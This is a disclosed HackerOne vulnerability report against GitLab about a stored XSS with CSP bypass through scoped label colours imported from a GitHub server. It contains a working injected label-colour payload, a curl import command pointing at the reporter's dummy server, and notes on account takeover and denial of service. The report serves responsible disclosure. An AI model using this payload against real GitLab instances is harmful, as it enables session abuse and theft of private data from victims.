# Bypass: Stored-XSS with CSP-bypass via scoped labels' color

## Report Details
- **Report ID**: 1693150
- **URL**: https://hackerone.com/reports/1693150
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-09-07T09:13:22.922Z
- **Disclosed**: 2023-02-19T22:43:39.198Z

## Reporter
- **Username**: yvvdwf
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
Hi team,

The [Stored-XSS with CSP-bypass via labels' color](https://hackerone.com/reports/1665658) has been mitigated in [Gitlab 15.3.2](https://about.gitlab.com/releases/2022/08/30/critical-security-release-gitlab-15-3-2-released/#stored-xss-via-labels-color). However it is not enough because it missed the case of [scoped label](https://gitlab.com/gitlab-org/gitlab/-/blob/85041966ed3eba23ee530a20c2eee374ef6e8617/ee/app/helpers/ee/labels_helper.rb#L33).

I notified this missing in the [original report](https://hackerone.com/reports/1665658#activity-18273269) and @galfaro encouraged me to submit a new report about this.


# Step to reproduce:

- To reproduce, we need the following prerequisites:

   + [Scoped labels](https://docs.gitlab.com/ee/user/project/labels.html#scoped-labels) are available in Gitlab Premium, so we need a premium account that can be obtained via the [free trial](https://about.gitlab.com/free-trial/)
   + A Gitlab personal access token. Go [here](https://gitlab.com/-/profile/personal_access_tokens?name=test&scopes=api) to create a new token with within `api` scope.

- Github does not allow to create arbitrary label colors. You can find in the attachment a dummy Github server in which we set a new label:
   + name: `yvvdwf::label-name` (the `::` to scope the label)
   + color: `">yvvdwf-label<form class='hidden gl-show-field-errors'><input title='<script>alert(document.domain)</script>'>`

- To easily reproduce, I'm hosting the dummy Github server at my own VPS, `http://51.75.74.52:11211`, I will shut it down once you validated the report.

- Open a new terminal, then run the following command, in which:
   + `$GL_TOKEN` is the the api token you've created above
   + `yvvdwf-group-a` is a group (or account) name having premium features


For example:

```bash
curl -kv "https://gitlab.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: $GL_TOKEN" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "523303538",
    "target_namespace": "yvvdwf-group-a",
    "new_name": "xss-on-label-color",
    "github_hostname": "http://51.75.74.52:11211"
}'
```

- After finishing, you can view the list of the label of the imported project. You should see a popup created by this javascript `alert(document.domain)`

- Since we can control the label color, we can create a Stored-XSS with CSP-bypass on another place rather than the page that lists the labels, such as, an issue or a merged request of another project by using [GitLab-specific references](https://docs.gitlab.com/ee/user/markdown.html#gitlab-specific-references)

# Example:

- https://gitlab.com/yvvdwf-group-a/xss-on-label-color/-/labels
- https://gitlab.com/yvvdwf-group-a/xss-on-label-color/-/issues/1

# Output of checks

This bug happens on GitLab.com

# Impact

Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.

Beside that, I would like to clarify some other metrics in the CVSS (the text in **bold** is copied from [your cvss calculator](https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator) )

- `AC:L`: **Stored XSS on a page that's part of the user's normal workflow (issue or merge request page)**: As I mentioned above the store-XSS is on the issue/MR requests of a project the attack may create an issue/MR
- `PR:N`: **The attacker is logged out - PR:N - but the victim is logged in**: The stored-XSS still exist even the attacker is logged out. 
- `C:H`: **Access tokens, runner tokens. Private repositories**: Indeed the XSS allows to execute any Rest API on behalf of the victim to get almost arbitrary private information of the victim (unless his password). It can even perform a *fake* account-take-over by changing the victim's username and immediately register a new account within the victim's username (as changing username does not require to confirm password)
- `A:L`: This Store-XSS with CSP-bypass can easily create DoS at the client side by exhausting CPU and RAM of the victim's Web browser. It can also be used to send as much as possible the requests to the server. The number of requests can increase by the number of victims who are viewing the XSS.

Best regards,

## Impact

Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.

## Attachments
- dummy-server-scoped-label.tar.gz
